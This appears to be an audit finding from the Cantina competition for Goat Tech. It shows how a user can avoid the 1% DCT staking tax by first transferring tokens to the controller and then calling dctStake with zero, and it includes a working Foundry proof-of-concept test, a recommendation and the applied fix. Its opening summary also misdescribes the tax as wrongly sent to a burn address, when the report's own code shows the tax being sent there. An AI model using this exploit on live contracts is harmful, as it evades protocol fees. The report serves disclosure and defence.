---
tags:
  - lang/solidity
  - sector/staking
  - platform/cantina
  - has/poc
  - severity/high
  - impact/mev/frontrun
  - impact/mev/sandwich
  - trigger/sandwich-attack
protocol: "[[Goat Tech]]"
auditors:
  - "[[cccz]]"
report: "https://cdn.cantina.xyz/reports/cantina_competition_goat_mar2024.pdf"
genome:
  - "[[fee-calculation]]"
  - "[[frontrun]]"
  - "[[sandwich]]"
  - "[[defi/sandwich-attack]]"
  - "[[frontrun-exposure]]"
---
# A user calling controller::dctstake can bypass tax by ﬁrst transferring the tokens to be staked in a separate transaction 

- id: 40665
- impact: HIGH
- protocol: [[Goat Tech]]
- reporter: cccz (Cantina)
- source: https://cdn.cantina.xyz/reports/cantina_competition_goat_mar2024.pdf

## Summary


The bug report discusses an issue in the Controller.sol file, specifically in line 430. When a user stakes DCT tokens using the dctStake function, there is a 1% tax on the amount being staked. However, this tax is not being applied correctly and is instead being transferred to a burn address. This creates a loophole where a user can avoid the tax by transferring tokens directly to the controller contract and then calling dctStake with a zero amount. The report includes a proof of concept test that shows this tax avoidance in action. The recommendation is to fix the issue by ensuring that the value set in _stake matches the original amount input in dctStake, thus preventing users from avoiding the tax. The bug has been fixed in the code by changing the dct.transfer function and adding a new line of code. 

## Details

## Context
**File:** Controller.sol#L430

## Impact
When a user stakes DCT tokens via `dctStake`, there is a 1% tax on their `amount_` to stake. This 1% "tax" is transferred to the burn address as shown here:

```solidity
uint taxA = LPercentage.getPercentA(amount_, _dctTaxPercent);
_dct.transfer(address(0xdead), taxA);
```

However, when `dctStake` calls `_stake`, the value a user is staking is calculated by reading the current DCT token balance of the controller contract as shown here:

```solidity
uint value = isEth_ ? _geth.balanceOf(address(this)) : _dct.balanceOf(address(this));
```

This means that a user could bundle two calls (likely via a single custom smart contract function call to avoid being frontrun/sandwich attacked), where they first transfer the DCT tokens to the controller contract and then call `dctStake` with `amount_` set to zero. Doing this would allow the user to benefit from staking 100% of their desired tokens by avoiding the 1% tax.

## Proof of Concept
The following test shows the tax avoidance:

```solidity
// Test Avoid Tax w/ dctStake
function test_DctStakeNoTax() public {
    uint256 defaultCode = ethSharing.defaultCode();
    // Alice first stakes eth to setup her pool
    supplyDCT(alice, 100 ether);
    vm.deal(alice, 100 ether);
    vm.startPrank(alice, alice);
    controller.ethStake{value: 1 ether}(payable(alice), 60 days, 0, defaultCode, 0.8 ether, 0);
    // Alice transfers the tokens directly to the controller contract
    dct.transfer(address(controller), 100 ether);
    // Alice then calls dctStake with 0 amount
    controller.dctStake(0, payable(alice), 60 days);
    vm.stopPrank();
    uint256 dLockerAmount = dct.balanceOf(address(dLocker));
    // Confirm tax was avoided
    assert(dLockerAmount == 100 ether);
    console.log(dLockerAmount);
}
```

This produces the following output:
```
[PASS] test_DctStakeNoTax() (gas: 5842502)
```

## Logs
### Recommendation
To avoid this issue, the value set in `_stake` should be the `amount_` originally input in `dctStake`. This would ensure that the user cannot avoid the 1% tax when staking.

## Goat
```solidity
fixed dct.transferFrom(msg.sender, address(this), amount); 
uint taxA = LPercentage.getPercentA(_thisDctBalance(), _dctTaxPercent);
```
